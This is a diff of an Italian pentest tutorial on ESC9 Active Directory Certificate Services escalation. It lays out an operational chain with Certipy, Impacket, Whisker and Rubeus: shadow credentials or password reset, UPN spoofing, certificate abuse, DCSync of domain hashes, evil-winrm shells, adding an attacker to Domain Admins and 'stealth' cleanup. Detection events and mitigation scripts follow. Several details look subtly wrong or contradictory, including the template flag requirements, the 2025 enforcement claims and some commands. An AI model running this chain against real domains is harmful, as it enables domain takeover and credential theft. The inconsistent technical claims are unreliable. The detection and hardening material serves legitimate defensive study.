@@ -1,9 +1,7 @@
 ---
 title: 'ESC9 ADCS: Privilege Escalation tramite Template senza SID Security Extension'
 slug: esc9-adcs
-description: >-
-  ESC9 sfrutta template AD CS senza SID Security Extension per impersonare
-  utenti privilegiati. Guida pratica con Certipy e UPN manipulation.
+description: ESC9 sfrutta template AD CS senza SID Security Extension per impersonare utenti privilegiati. Guida pratica con Certipy e UPN manipulation.
 image: /9.webp
 draft: false
 date: 2026-03-08T00:00:00.000Z
@@ -18,289 +16,652 @@ tags:
   - certipy
 ---
 
-ESC9 è una tecnica di **Active Directory Privilege Escalation tramite AD CS** che sfrutta certificate template configurati senza la **SID Security Extension**. Questa estensione (`szOID_NTDS_CA_SECURITY_EXT`) è stata introdotta negli aggiornamenti **Certifried (CVE-2022-26923)** per permettere ai Domain Controller di mappare in modo sicuro un certificato a un account Active Directory usando il **SID**.
+# ESC9 ADCS: Escalazione a Domain Admin via Weak Certificate Mapping | Certipy Exploitation + Event 39/41 Detection + Mitigazione (KB5014754) 2026
 
-Quando un template ha il flag **CT\_FLAG\_NO\_SECURITY\_EXTENSION**, i certificati emessi **non includono il SID dell’utente che ha richiesto il certificato**. Questo costringe il KDC a usare metodi di mapping più deboli come:
+**ESC9** è una misconfiguration critica in Active Directory Certificate Services (ADCS) che consente di escalare privilegi impersonando utenti privilegiati come Domain Admin. A differenza di altre ESC (ESC1, ESC2, ecc.), ESC9 non si basa su problemi di enrollment diretti, ma su **certificate mapping debole** — il processo attraverso il quale Active Directory associa un certificato a un account AD.
 
-* **UPN mapping**
-* **DNS mapping**
+Quando un certificate template manca della **security extension** (`szOID_NTDS_CA_SECURITY_EXT`, OID 1.3.6.1.4.1.311.25.2) e il Domain Controller non applica strong binding enforcement con valore 2, un attaccante può modificare l'UPN (User Principal Name) di un account controllato per corrispondere a quello di un admin, richiedere un certificato, e autenticarsi come admin tramite PKINIT.
 
-Se il dominio non è in **Full Enforcement mode**, questi metodi possono permettere l’impersonazione di altri utenti.
-
-Il risultato: un attaccante può ottenere un certificato valido che il KDC mapperà all’account sbagliato.
+Questa vulnerabilità è nata da **KB5014754** (patch Microsoft maggio 2022) che introdusse la security extension per proteggere certificate mapping, ma richiese backward compatibility disabilitando selettivamente la protezione su specifici template.
 
 ***
 
-# Identificazione con Certipy
+## Come Funziona Certificate Mapping
 
-Certipy rileva ESC9 controllando il flag `NoSecurityExtension` nel template.
+### Implicit vs. Explicit Mapping
+
+Active Directory supporta due modalità di certificate mapping:
+
+**Implicit Mapping** associa il certificato a un account AD basandosi su campi nel Subject Alternative Name (SAN):
+
+* User Principal Name (UPN)
+* DNS name (dNSHostName per computer)
+* RFC822 (email)
+
+Questo metodo è vulnerabile perché attaccanti possono modificare questi campi su account controllati.
+
+**Explicit Mapping** richiede una connessione manuale tramite l'attributo `altSecurityIdentities`. Risulta più sicuro in teoria, ma se l'attaccante ha write permissions su un account, può aggiungere mapping arbitrari.
+
+### Strong vs. Weak Mapping
+
+**Strong Mapping** verifica che il certificato contenga `objectSid` — identificatore univoco legato all'account AD. Impostato tramite `szOID_NTDS_CA_SECURITY_EXT`.
+
+**Weak Mapping** si affida solo a UPN/DNS nel SAN, senza validare l'`objectSid`. ESC9 sfrutta questa modalità.
+
+### StrongCertificateBindingEnforcement
+
+Microsoft ha introdotto questa chiave di registro per forzare strong binding:
+
+```
+HKLM\System\CurrentControlSet\Services\Kdc\StrongCertificateBindingEnforcement
+```
+
+* **Mode 0 (Disabled)**: Nessun controllo forte, accetta weak mapping sempre
+* **Mode 1 (Compatibility)**: Il DC cerca `objectSid`, ma consente weak mapping se assente (backward compat)
+* **Mode 2 (Full Enforcement)**: Certificati senza `objectSid` sono rifiutati — **ESC9 è impossibile**
+
+**ESC9 sfrutta Mode 0 o 1**.
+
+### CertificateMappingMethods (Schannel)
+
+Chiave di registro separata per TLS/SSL authentication:
+
+```
+HKLM\System\CurrentControlSet\Control\SecurityProviders\Schannel\CertificateMappingMethods
+```
+
+Bitmask (default 0x18):
+
+* `0x01` = Explicit mapping (altSecurityIdentities)
+* `0x02` = Principal name mapping (UPN in SAN)
+* `0x04` = RFC822 mapping (email)
+* `0x08` = DNS name mapping
+* `0x10` = Issuer-subject mapping
+* `0x1F` = All methods
+
+**ESC10 Case 2** sfrutta questi bits se `0x02` o `0x04` abilitati + UPN spoofing.
+
+***
+
+## Attributi Template Critici
+
+### msPKI-Enrollment-Flag
+
+Controlla come CA emette certificati. Flag rilevante per ESC9:
+
+* **CT\_FLAG\_NO\_SECURITY\_EXTENSION (0x80000, 524288 decimale)**: Disabilita inclusione di `objectSid` nel certificato
+
+Verificare in ADSI Edit:
+
+```
+CN=TemplateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
+→ msPKI-Enrollment-Flag = 524288 (o OR con altri flag)
+```
+
+### msPKI-Certificate-Name-Flag
+
+Controlla come il soggetto del certificato è costruito. Valori vulnerabili:
+
+* **0x0 (0)**: Build from AD only — Safe
+* **0x1 (1)**: Supply in request — Vulnerable (utente fornisce subject)
+* **0x3 (3)**: Build from AD + Supply in request — Vulnerable
+* **0x10 (16)**: Enforce UPN in SAN — Required per ESC9 se combinato con supply
+
+**Se msPKI-Certificate-Name-Flag = 1 o 3 E SAN include UPN → ESC9 exploitable**
+
+### Extended Key Usage (EKU)
+
+Definisce quali operazioni il certificato può compiere. Per ESC9:
+
+* **Client Authentication** — Consente autenticazione come user
+
+***
+
+## Requisiti per Sfruttare ESC9
+
+Un certificate template è vulnerabile a ESC9 quando soddisfa **TUTTI** questi criteri:
+
+### 1. CT\_FLAG\_NO\_SECURITY\_EXTENSION Abilitato
+
+L'attributo `msPKI-Enrollment-Flag` deve includere il flag `0x80000` (524288) che disabilita l'inclusione dell'`objectSid`.
+
+Verificare:
 
 ```bash
-certipy find -u 'user@corp.local' -p 'Password123' -dc-ip 10.0.0.100 -vulnerable -enabled -stdout
+certipy-ad find -u 'user@domain.local' -p 'Pass' -dc-ip 10.0.0.100 -vulnerable
 ```
 
-Output tipico:
+Cercare: `Enrollment Flag: NoSecurityExtension`
+
+### 2. EKU Client Authentication
+
+Template ha **Extended Key Usage** = **Client Authentication**
+
+### 3. Nessuna Manager Approval
 
 ```
-Certificate Templates
+msPKI-RA-Application-Policies = (empty or no manager approval flags)
+```
 
-Template Name : VulnTemplate
-Enabled : True
-Client Authentication : True
+### 4. Enrollment Permissions Permissive
 
-Enrollment Flag : NoSecurityExtension
+Utenti low-privileged come `Domain Users` o `Authenticated Users` possono enrollare.
 
-Permissions
-  Enrollment Rights : CORP.LOCAL\Domain Users
+### 5. Write Permissions su Account Target
 
+L'attaccante ha almeno `GenericWrite`, `WriteDACL`, o `GenericAll` su un account AD. Tramite questi permessi modifica l'UPN.
+
+### 6. StrongCertificateBindingEnforcement != 2
+
+DC ha Mode 0 o 1 (non Mode 2 full enforcement).
+
+***
+
+## Enumerazione di Template Vulnerabili
+
+### Con Certipy
+
+```bash
+certipy-ad find -u 'user@domain.local' -p 'Password123' \
+  -dc-ip 10.0.0.100 -vulnerable -enabled -stdout
+```
+
+Cercare output:
+
+```
 [!] Vulnerabilities
   ESC9 : Template has no security extension
+
+msPKI-Enrollment-Flag : NoSecurityExtension
+msPKI-Certificate-Name-Flag : 1 or 3 (supply in request)
+Extended Key Usage (EKU) : Client Authentication
+Enrollment Rights : Domain Users
 ```
 
-Indicatori chiave:
+### Con BloodHound
 
-* `Enrollment Flag : NoSecurityExtension`
-* `[!] Vulnerabilities ESC9`
-* EKU **Client Authentication**
-* utenti con **Enrollment Rights**
+Identificare:
 
-***
+* Template con `NoSecurityExtension` (flag 0x80000)
+* Account su cui si ha `GenericWrite`, `WriteDACL`, `GenericAll`
+* BloodHound edges **ADCSESC9a** / **ADCSESC9b** (4.2+) — collegano account exploitable a domain se ESC9 + weak DC setting
 
-# Exploit ESC9 ADCS con Certipy
-
-Il modo classico di sfruttare ESC9 è tramite **UPN manipulation**.
-
-L'attaccante modifica temporaneamente l’UPN di un account controllato per farlo combaciare con quello di un utente privilegiato.
-
-***
-
-## Step 1 — Leggere l’UPN della vittima
+### Con LDAP Query
 
 ```bash
-certipy account \
--u 'attacker@corp.local' -p 'Passw0rd!' \
--dc-ip '10.0.0.100' -user 'victim' \
-read
-```
-
-Output:
-
-```
-userPrincipalName : victim@CORP.LOCAL
+ldapsearch -H ldap://dc01.domain.local -D 'CN=admin,CN=Users,DC=domain,DC=local' \
+  -w Password123 -b 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local' \
+  '(msPKI-Enrollment-Flag=524288)' displayName msPKI-Enrollment-Flag
 ```
 
 ***
 
-## Step 2 — Modificare temporaneamente l’UPN
+## Exploit ESC9 – Step by Step
+
+### Step 1: Enumerare Template Vulnerabili
 
 ```bash
-certipy account \
--u 'attacker@corp.local' -p 'Passw0rd!' \
--dc-ip '10.0.0.100' -upn 'administrator' \
--user 'victim' update
+certipy-ad find -u 'attacker@domain.local' -p 'Password123' \
+  -dc-ip 192.168.1.100 -vulnerable -enabled
 ```
 
-Ora l’account **victim** ha UPN `administrator`.
+Identificare template con flag `NoSecurityExtension` e enrollment rights per `Domain Users`.
 
-***
+### Step 2: Identificare Account Controllabile
 
-## Step 3 — Ottenere credenziali della vittima (opzionale)
+Usando BloodHound, trovare un utente su cui si ha `GenericWrite`, `WriteDACL`, o `GenericAll`. Questo account servirà come **proxy** per l'impersonazione.
 
-Se l'attaccante non ha credenziali può usare **Shadow Credentials**.
+Esempio: attacker controlla `proxy_user`.
+
+### Step 3: Verificare Permessi
+
+Confermare accesso:
 
 ```bash
-certipy shadow \
--u 'attacker@corp.local' -p 'Passw0rd!' \
--dc-ip '10.0.0.100' -account 'victim' \
-auto
+impacket-dacledit -action read -dc-ip 192.168.1.100 \
+  domain.local/attacker:'Password123' \
+  -principal attacker -target proxy_user
 ```
 
-Output:
+Output atteso: `FullControl` o almeno `GenericWrite`.
 
-```
-Saving credential cache to 'victim.ccache'
-NT hash for 'victim'
-```
-
-***
-
-## Step 4 — Richiedere certificato dal template ESC9
+Se solo `WriteOwner` o `WriteDACL`, escalare con dacledit:
 
 ```bash
-export KRB5CCNAME=victim.ccache
+impacket-dacledit -action write -rights 'FullControl' \
+  -principal attacker -target proxy_user -dc-ip 192.168.1.100 \
+  domain.local/attacker:'Password123'
 ```
+
+### Step 4: Ottenere Credenziali del Proxy Account
+
+**Opzione A: Shadow Credentials**
 
 ```bash
-certipy req \
--k -dc-ip '10.0.0.100' \
--target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
--template 'VulnTemplate'
+certipy-ad shadow auto -u 'attacker@domain.local' \
+  -p 'Password123' -account proxy_user -dc-ip 192.168.1.100
 ```
 
-Output:
+Output: hash NT e ccache per autenticarsi come `proxy_user`.
 
-```
-Got certificate with UPN 'administrator@corp.local'
-Certificate has no object SID
-Saving certificate to administrator.pfx
-```
-
-Il certificato contiene **UPN Administrator ma nessun SID**.
-
-***
-
-## Step 5 — Ripristinare UPN originale
+**Opzione B: Reset Password** (più rumoroso)
 
 ```bash
-certipy account \
--u 'attacker@corp.local' -p 'Passw0rd!' \
--dc-ip '10.0.0.100' -upn 'victim@corp.local' \
--user 'victim' update
+impacket-net.py -domain-controller 192.168.1.100 \
+  -domain domain.local -username attacker \
+  -password Password123 user edit -target proxy_user -newpass 'NewPass123!'
 ```
 
-***
+### Step 5: Modificare UPN del Proxy Account
 
-## Step 6 — Autenticazione come Administrator
+**CRITICO:** Cambiare l'UPN di `proxy_user` per corrispondere a quello dell'admin:
 
 ```bash
-certipy auth \
--dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
--username 'administrator' -domain 'corp.local'
+certipy-ad account update -u 'attacker@domain.local' \
+  -p 'Password123' -user proxy_user \
+  -upn 'Administrator@domain.local' -dc-ip 192.168.1.100
 ```
 
-Output:
-
-```
-Got TGT
-Saving credential cache to administrator.ccache
-Got hash for administrator
-```
-
-Risultato:
-
-* **Kerberos TGT**
-* **NT hash**
-* **Domain Admin**
-
-***
-
-# ESC9 combinato con ESC6
-
-ESC9 diventa ancora più potente se combinato con **ESC6**.
-
-ESC6 permette di inserire **SAN arbitrari nella richiesta di certificato**.
-
-In questo caso l'attaccante può includere direttamente:
-
-* UPN della vittima
-* SID della vittima
-
-***
-
-### Richiesta certificato
+**Nota importante:** Se il DC è sensibile, usare **bare UPN** senza `@domain` per evitare collision:
 
 ```bash
-certipy req \
--u 'attacker@corp.local' -p 'Passw0rd!' \
--dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
--ca 'CORP-CA' -template 'VulnTemplate' \
--upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'
+certipy-ad account update -u 'attacker@domain.local' \
+  -p 'Password123' -user proxy_user \
+  -upn 'Administrator' -dc-ip 192.168.1.100
 ```
 
-Output:
-
-```
-Got certificate with UPN 'administrator@corp.local'
-Certificate object SID is 'S-1-5-21-...-500'
-Saving certificate to administrator.pfx
-```
-
-***
-
-### Autenticazione
+Verificare cambio:
 
 ```bash
-certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
+ldapsearch -H ldap://192.168.1.100 -D 'CN=attacker,CN=Users,DC=domain,DC=local' \
+  -w Password123 -b 'DC=domain,DC=local' \
+  '(sAMAccountName=proxy_user)' userPrincipalName
 ```
 
-Output:
+### Step 6: Richiedere Certificato
 
-```
-SAN UPN : administrator@corp.local
-SAN URL SID : S-1-5-21-...-500
-Got TGT
+```bash
+certipy-ad req -u 'proxy_user@domain.local' \
+  -hashes ':hash_nt' -ca 'domain-DC-CA' \
+  -template 'TemplateName' -dc-ip 192.168.1.100
 ```
 
-Questa tecnica funziona anche con **StrongCertificateBindingEnforcement = 2**.
+Il certificato sarà emesso con UPN = `Administrator@domain.local` (o `Administrator`) ma senza `objectSid`.
+
+### Step 7: Ripristinare UPN Originale PRIMA di Auth
+
+**ESSENZIALE:** Cambiare UPN indietro prima di autenticarsi, altrimenti DC mapperà cert a `proxy_user`:
+
+```bash
+certipy-ad account update -u 'attacker@domain.local' \
+  -p 'Password123' -user proxy_user \
+  -upn 'proxy_user@domain.local' -dc-ip 192.168.1.100
+```
+
+Aspettare \~5-10 secondi per AD replication.
+
+### Step 8: Autenticarsi come Administrator
+
+```bash
+certipy-ad auth -pfx administrator.pfx -domain domain.local \
+  -dc-ip 192.168.1.100
+```
+
+Output: NT hash di Administrator e ccache Kerberos.
+
+### Step 9: Verificare Hash
+
+```bash
+nxc ldap 192.168.1.100 -u Administrator \
+  -H 'nt_hash_obtained' -d domain.local
+```
+
+Output: `[+]` significa hash valido.
 
 ***
 
-# Detection ESC9 ADCS
+## Prove di Impatto
 
-Controllare:
+Una volta compromesso Domain Admin:
 
-* template con `NoSecurityExtension`
-* template con **Client Authentication**
-* permessi di enrollment troppo ampi
+### DCSync
 
-Indicatori utili:
-
-* certificati senza **SID security extension**
-* modifiche sospette agli **UPN**
-
-***
-
-# Mitigation ESC9 ADCS
-
-Misure principali:
-
-**1️⃣ Non usare `CT_FLAG_NO_SECURITY_EXTENSION`**
-nei template.
-
-**2️⃣ Abilitare Strong Certificate Binding**
-
-```
-StrongCertificateBindingEnforcement = 2
+```bash
+secretsdump.py -just-dc domain.local/Administrator@192.168.1.100 \
+  -hashes ':nt_hash'
 ```
 
-**3️⃣ Limitare enrollment rights**
+Estrae tutti i credential hash del dominio.
 
-**4️⃣ Abilitare manager approval** sui template sensibili.
+### Evil-WinRM
 
-***
+```bash
+evil-winrm -i 192.168.1.100 -u Administrator -H 'nt_hash'
+```
 
-# FAQ — ESC9 ADCS
+Shell interattiva su Domain Controller.
 
-### Cos'è ESC9?
+### LDAP Shell
 
-Un template che emette certificati **senza SID security extension**.
+```bash
+certipy-ad auth -pfx administrator.pfx \
+  -ldap-shell -dc-ip 192.168.1.100
+```
 
-### Perché è pericoloso?
-
-Il KDC può usare mapping **UPN/DNS più deboli**, permettendo impersonazione.
-
-### ESC9 funziona su domini patchati?
-
-Dipende dalla configurazione del KDC.
-Funziona sempre se combinato con **ESC6**.
-
-### Qual è la differenza tra ESC9 e ESC6?
-
-[ESC6](https://hackita.it/articoli/esc6-adcs) permette SAN arbitrari.
-ESC9 rimuove il SID dal certificato.
+Eseguire operazioni LDAP (modify group memberships, create accounts persistenti, ecc.).
 
 ***
 
-**Key Takeaway:** se un template AD CS non include la **SID Security Extension**, il KDC può mappare il certificato usando solo l’UPN — permettendo impersonazione di account privilegiati.
+## Detection & IOC
+
+### Event ID Critici
+
+| Event | Source        | Significato                                 | Indicazione                                                 |
+| ----- | ------------- | ------------------------------------------- | ----------------------------------------------------------- |
+| 4886  | CA            | Certificate request received                | Ricerca anomala di template                                 |
+| 4887  | CA            | Certificate issued                          | Cert emesso per identità non matchante                      |
+| 4738  | DC            | User account changed                        | UPN modified (pre-cert-request)                             |
+| 4769  | DC            | Kerberos TGS requested                      | TGT per DA da macchina inaspettata                          |
+| 39/41 | DC (Kerberos) | Cert mapping failure / weak mapping warning | Cert senza SID o UPN mismatch — Strong ESC9/ESC10 indicator |
+| 4900  | CA            | Template permission changed                 | ACL modification su template                                |
+
+**Event ID 39/41:** KDC genera quando certificato è valido ma non mappa strongly. Include mismatch SID: il SID nel certificato (o mancante) non corrisponde al SID del richiedente. Con StrongCertificateBindingEnforcement = 1, viene loggato e auth fallisce. Se = 2, login direttamente rifiutato (nessun log).
+
+### Query LDAP per Identificare Template Vulnerabili
+
+```bash
+ldapsearch -H ldap://dc01.domain.local -D 'CN=admin,CN=Users,DC=domain,DC=local' \
+  -w Password123 -b 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local' \
+  '(|(msPKI-Enrollment-Flag=524288)(msPKI-Enrollment-Flag=524544))' \
+  displayName msPKI-Enrollment-Flag msPKI-Certificate-Name-Flag
+```
+
+### Timeline di Attacco Tipico
+
+```
+T0:     Shadow credential injection
+T0+5min: UPN modification on proxy account
+T0+10min: Certificate request from vulnerable template
+T0+15min: UPN reverted
+T0+20min: PKINIT authentication as target
+T0+25min: DCSync or persistence setup
+```
+
+### Correlazione Log
+
+Cercare questa sequenza:
+
+1. Event 4886/4887 (cert issued)
+2. Event 4738 (UPN change) PRIMA di 4886
+3. Event 4738 (UPN reverted) DOPO 4886
+4. Event 4768/4769 (TGT/TGS per privileged account) SUBITO DOPO
 
 ***
 
-> ESC9 è una delle tecniche più importanti nei certificate attacks.
-> Per vedere tutte le escalation AD CS consulta la guida completa:
-> [https://hackita.it/articoli/adcs-esc1-esc16](https://hackita.it/articoli/adcs-esc1-esc16)Continua con le tecniche successive:
-> [https://hackita.it/articoli/esc10-adcs](https://hackita.it/articoli/esc10-adcs) · [https://hackita.it/articoli/esc11-adcs](https://hackita.it/articoli/esc11-adcs)Se queste guide ti sono utili puoi supportare HackIta:
-> [https://hackita.it/supporto](https://hackita.it/supporto)Vuoi imparare pentesting Active Directory o testare la sicurezza della tua infrastruttura?
-> [https://hackita.it/servizi](https://hackita.it/servizi)Riferimenti tecnici:
-> [https://specterops.io/blog/2021/06/17/certified-pre-owned/](https://specterops.io/blog/2021/06/17/certified-pre-owned/)
-> [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)
-> [https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/)
+## Comandi Operativi Completi
+
+### Verifica Pre-Attack
+
+Verificare che UPN sia stato cambiato correttamente PRIMA di richiedere il certificato:
+
+```bash
+ldapsearch -H ldap://192.168.1.100 -D 'CN=attacker,CN=Users,DC=domain,DC=local' \
+  -w Password123 -b 'DC=domain,DC=local' \
+  '(sAMAccountName=proxy_user)' userPrincipalName
+```
+
+Output atteso: `userPrincipalName: Administrator@domain.local`
+
+### Enumerazione Certificati da Certificato Valido
+
+Dopo aver ottenuto il certificato, parsearlo per verificare UPN/SID:
+
+```bash
+certipy-ad cert -pfx administrator.pfx -text -nokey
+```
+
+Verificare che SID sia assente o non corrisponda a Administrator reale.
+
+### Estrazione NT Hash (UnPac the Hash)
+
+Certipy estrae automaticamente l'hash, ma per esplicitare:
+
+```bash
+certipy-ad auth -pfx administrator.pfx -domain domain.local -dc-ip 192.168.1.100
+```
+
+Output: `[*] Got hash for 'Administrator@domain.local': aabbccdd...` (NT hash in plaintext)
+
+Se il comando non estrae hash, usare impacket direttamente:
+
+```bash
+python3 -m impacket.krb5ccache -c administrator.ccache
+```
+
+### Windows: Certify + Rubeus Chain
+
+**Enumeration:**
+
+```batch
+.\Certify.exe find /vulnerable /enabled
+```
+
+**Iniezione Shadow Credential (Whisker):**
+
+```batch
+.\Whisker.exe add /target:proxy_user /dc:192.168.1.100 /path:C:\temp
+```
+
+Output: Comando Rubeus da eseguire.
+
+**Request Certificate:**
+
+```batch
+.\Rubeus.exe asktgt /user:proxy_user /certificate:C:\path\to\proxy_user.pfx /password:"password_from_whisker" /domain:domain.local /dc:192.168.1.100 /getcredentials /show
+```
+
+**Estrazione Hash:**
+L'output di Rubeus include già l'NT hash di proxy\_user. Per target (Administrator), usare certificate authentication prima.
+
+### Reset Password Alternativo (impacket-net)
+
+Se shadow credentials non funzionano o scelta operativa è reset:
+
+```bash
+impacket-net.py domain.local/attacker:Password123 -dc-ip 192.168.1.100 \
+  user change -username proxy_user -newpass 'TempPassword123!'
+```
+
+**Nota:** Più rumoroso (Event 4723), lascia traccia di reset. Shadow credentials preferred.
+
+### PKINIT Esplicito (Test Compatibilità)
+
+Alcuni ambienti richiedono PKINIT esplicito invece di PKINIT automatico di Certipy:
+
+```bash
+kinit -C FILE:administrator.pfx Administrator@DOMAIN.LOCAL
+```
+
+Se fallisce con `KDC_ERR_C_PRINCIPAL_UNKNOWN`, la mappatura ha fallito. Verificare:
+
+* UPN nel certificato
+* StrongCertificateBindingEnforcement setting
+* Explicit mapping setup
+
+### Validazione Hash su LDAP
+
+Prima di passare a post-exploitation, validare hash:
+
+```bash
+nxc ldap 192.168.1.100 -u Administrator -H 'hash_ottenuto' -d domain.local --continue-on-error
+```
+
+Output: `[+] domain.local\Administrator` = hash valido.
+
+### Post-Exploitation: DCSync Completo
+
+```bash
+secretsdump.py -just-dc -just-dc-user Administrator \
+  domain.local/Administrator@192.168.1.100 -hashes ':nt_hash'
+```
+
+Output: Tutti gli hash del dominio in NTDS.dit.
+
+### Post-Exploitation: Evil-WinRM con Verifica
+
+```bash
+evil-winrm -i 192.168.1.100 -u Administrator -H 'hash_ottenuto' \
+  -s /usr/share/evil-winrm/scripts
+```
+
+Dentro la shell:
+
+```powershell
+whoami /all
+Get-NetComputer -ComputerName DC01 -ComputerIdentity
+```
+
+Verificare privilegi Domain Admin.
+
+### LDAP Shell per Operazioni Silenziose
+
+```bash
+certipy-ad auth -pfx administrator.pfx -domain domain.local \
+  -ldap-shell -dc-ip 192.168.1.100
+```
+
+Shell interattiva con permessi admin. Esempi:
+
+```
+> add_group_member "Domain Admins" "attacker"
+> modify_user_attribute "Administrator" "description" "pwned"
+> list_domain_admins
+```
+
+### Cleanup Stealth
+
+Ripristinare tracce su account proxy:
+
+```bash
+# Verificare UPN è stato ripristinato
+ldapsearch -H ldap://192.168.1.100 -D 'CN=attacker,CN=Users,DC=domain,DC=local' \
+  -w Password123 -b 'DC=domain,DC=local' \
+  '(sAMAccountName=proxy_user)' userPrincipalName
+
+# Output atteso: userPrincipalName: proxy_user@domain.local
+```
+
+Se shadow credentials usate, pulire con:
+
+```bash
+certipy-ad shadow auto -u attacker@domain.local -p Password123 \
+  -account proxy_user -dc-ip 192.168.1.100 -remove
+```
+
+***
+
+## Mitigazione
+
+### 1. Abilitare Full Enforcement (PRIMARIO)
+
+Su **OGNI** Domain Controller, impostare Mode 2:
+
+```batch
+reg add "HKLM\System\CurrentControlSet\Services\Kdc" /v StrongCertificateBindingEnforcement /t REG_DWORD /d 2 /f
+```
+
+Riavviare servizio KDC:
+
+```batch
+net stop kdc && timeout /t 5 && net start kdc
+```
+
+**Nota:** Questo può rompere autenticazione con certificati vecchi (pre-maggio 2022). Testare in staging first.
+
+### 2. Rimuovere CT\_FLAG\_NO\_SECURITY\_EXTENSION
+
+Da tutti i template non necessari:
+
+```powershell
+Get-ADObject -Filter {objectClass -eq 'pKICertificateTemplate'} -Properties msPKI-Enrollment-Flag | 
+  Where-Object {$_.'msPKI-Enrollment-Flag' -band 0x80000} | 
+  ForEach-Object {
+    Set-ADObject $_ -Replace @{'msPKI-Enrollment-Flag'=($_.'msPKI-Enrollment-Flag' -bxor 0x80000)}
+  }
+```
+
+Verificare:
+
+```powershell
+Get-ADObject -Filter {objectClass -eq 'pKICertificateTemplate'} -Properties msPKI-Enrollment-Flag | 
+  Where-Object {$_.'msPKI-Enrollment-Flag' -band 0x80000}
+```
+
+(Non deve restituire nulla)
+
+### 3. Limitare Enrollment Permissions
+
+Assegnare enrollment a specifici security groups admin-only, non a `Domain Users`:
+
+```powershell
+# Rimuovere Domain Users da template
+$template = Get-ADObject -Identity "CN=UserTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local"
+$acl = Get-Acl -Path "AD:\$($template.DistinguishedName)"
+# (Rimuovere SID di Domain Users)
+```
+
+### 4. Abilitare Audit Certificate Issuance
+
+Su CA:
+
+```batch
+certutil -setreg CA\AuditFilter 127
+net stop certsvc && net start certsvc
+```
+
+Registra Event 4886/4887.
+
+### 5. Monitor Write Permissions
+
+Script PowerShell periodico per rilevare nuovi permessi `GenericWrite`/`GenericAll` su account:
+
+```powershell
+Get-ADUser -Filter * | ForEach-Object {
+  $acl = Get-Acl "AD:\$($_.DistinguishedName)"
+  $acl.Access | Where-Object {$_.ActiveDirectoryRights -match "GenericWrite|GenericAll" -and $_.AccessControlType -eq "Allow"}
+}
+```
+
+### 6. Implementare Approval Policy
+
+Richiedere manager approval su template sensibili (CA MMC → Template → Properties → Issuance Requirements).
+
+***
+
+## Differenza ESC9 vs ESC10
+
+| Aspetto                  | ESC9                                                              | ESC10                                                                               |
+| ------------------------ | ----------------------------------------------------------------- | ----------------------------------------------------------------------------------- |
+| **Requisito Template**   | CT\_FLAG\_NO\_SECURITY\_EXTENSION (msPKI-Enrollment-Flag 0x80000) | Nessun template specifico richiesto                                                 |
+| **Requisito DC**         | StrongCertificateBindingEnforcement = 0 o 1                       | StrongCertificateBindingEnforcement = 0 o CertificateMappingMethods abilita UPN/DNS |
+| **Attributo Modificato** | UPN del proxy account                                             | UPN (ESC10 Case A) o dNSHostName (ESC10 Case B)                                     |
+| **Impatto**              | Kerberos authentication                                           | Kerberos + Schannel (TLS)                                                           |
+| **Scope**                | Solo template vulnerabili                                         | Any client-auth template                                                            |
+
+***
+
+## Timeline Rollout Microsoft & Enforcement Phases
+
+Dopo KB5014754 (maggio 2022), Microsoft ha implementato rollout in tre fasi:
+
+1. **Compatibility Mode (maggio 2022)**: DC accetta cert senza SID se UPN mappa. Log Event 39 ma allow auth.
+2. **Audit Phase (fino febbraio 2025)**: DC continua allow, abilita detection massiccio di mismatch.
+3. **Enforcement Phase (febbraio 2025+)**: DC rifiuta cert senza SID, ESC9 diventa impossibile.
+
+Per organizzazioni che devono mantenere backward compat con vecchi cert (pre-maggio 2022), fallback a compatibility mode rimane possibile tramite registry, ma espone a ESC9/ESC10.
+
+***
+
+## Riferimenti
+
+* [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy) — Certipy (tool primary)
